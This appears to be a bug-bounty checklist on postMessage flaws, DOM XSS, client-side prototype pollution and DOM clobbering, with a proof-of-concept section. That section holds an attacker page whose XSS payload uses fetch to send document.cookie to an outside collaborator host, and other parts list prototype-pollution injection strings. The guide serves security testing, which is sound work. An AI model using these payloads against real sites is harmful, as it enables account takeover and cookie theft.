# postMessage & DOM-Based Issues

**What it is:** Insecure cross-window messaging and unsafe client-side data flows (DOM XSS, DOM clobbering, prototype pollution).

## postMessage
- [ ] Listener with no `event.origin` check → send malicious message from your page.
- [ ] Data from message flows into a sink (`innerHTML`, `eval`, `location`) → DOM XSS.
- [ ] Message leaks secrets to `*` target origin (send to attacker frame).
- [ ] Grep JS for `addEventListener("message"` and check origin validation.

## DOM XSS
- [ ] Sources: `location.hash/search/href`, `document.referrer`, `postMessage`, `localStorage`.
- [ ] Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `.src`, `jQuery $()`.
- [ ] Trace source→sink with DOM Invader (Burp) / manual.

## Client-side prototype pollution
- [ ] Inject `__proto__[x]=y` / `constructor[prototype][x]=y` via query/JSON/hash.
- [ ] Look for a gadget that turns the polluted prop into XSS/config change.
- [ ] Tool: `ppmap`, DOM Invader.

## DOM clobbering
- [ ] Inject `<a id=x>`/`<form name=x>` where JS reads a global by that name and there is no CSP for inline.

## Impact
DOM XSS (ATO), config override, data leak across frames.

## Tools
Burp **DOM Invader**, `ppmap`, manual JS review (see `00-recon/05-js-analysis.md`).

## 🎯 PoC — attacker page → victim sink (no origin check)

Vulnerable listener on `target.com`:
```javascript
window.addEventListener("message", e => {
  document.getElementById("widget").innerHTML = e.data;   // sink, no e.origin check
});
```
Attacker page frames the target and posts a payload:
```html
<iframe src="https://target.com/embed" id="t"></iframe>
<script>
  document.getElementById("t").onload = () => {
    document.getElementById("t").contentWindow.postMessage(
      "<img src=x onerror=fetch('https://COLLAB/c?'+document.cookie)>", "*");
  };
</script>
```
Result: payload reaches `innerHTML` in `target.com`'s origin → DOM XSS fires there. Collaborator receives the victim's cookie. (Client-side bug — no server request/response; evidence is the fired `alert(document.domain)` showing `target.com` + the Collaborator hit.)

## Deep cuts — origin-check bypasses & more sinks
- [ ] **Broken origin validation patterns:** `e.origin.indexOf("target.com")>-1` (matches `target.com.evil.com`), `startsWith`/unanchored regex, `endsWith("target.com")` (matches `eviltarget.com`), `e.origin.includes(...)`, comparing against `document.referrer`, or accepting `null`. Any of these = send from a matching attacker origin.
- [ ] **Leak direction (target→attacker):** a handler that *replies* with `e.source.postMessage(secret, "*")` or posts data to `*` leaks tokens/PII to your framing page — you don't even need a sink, just receive.
- [ ] **Sinks beyond innerHTML:** `location`/`location.href`/`.assign` (→ `javascript:`/open-redirect), `eval`/`Function`/`setTimeout(str)`, `document.write`, `.src`/`.href` on script/iframe/img, `postMessage`-relayed into `WebSocket`/`fetch` (SSRF-ish), `JSON.parse`→template, framework bindings (`v-html`, `dangerouslySetInnerHTML`, `ng-bind-html`).
- [ ] **Alt sources:** `window.name` (survives navigation, cross-origin-writable), `location.hash`/`search`, `document.referrer`, `BroadcastChannel`, `MessageChannel` ports, `localStorage`/`postMessage` bridges between SDKs (chat widgets, payment iframes, embed SDKs are goldmines).
- [ ] **Client-side prototype-pollution gadgets:** pollute via `?__proto__[x]=`/hash/JSON, then a library reads the polluted prop into a sink — known gadgets in jQuery, Lodash `merge/set`, `$.extend(true,...)`, Chart.js, sanitizer configs (`09-advanced/02`).
- [ ] **DOM clobbering** to defeat CSP/no-JS injection (`05-client-side/08`).
- [ ] **Hunt fast:** Burp **DOM Invader** with the postMessage + prototype-pollution + clobbering canaries on; grep JS for `addEventListener("message"` and every sink above.

## Report notes
Show source→sink chain and the executed payload / clobbered value. Name the broken origin check (indexOf/startsWith/endsWith/null) or the leak-to-`*`.
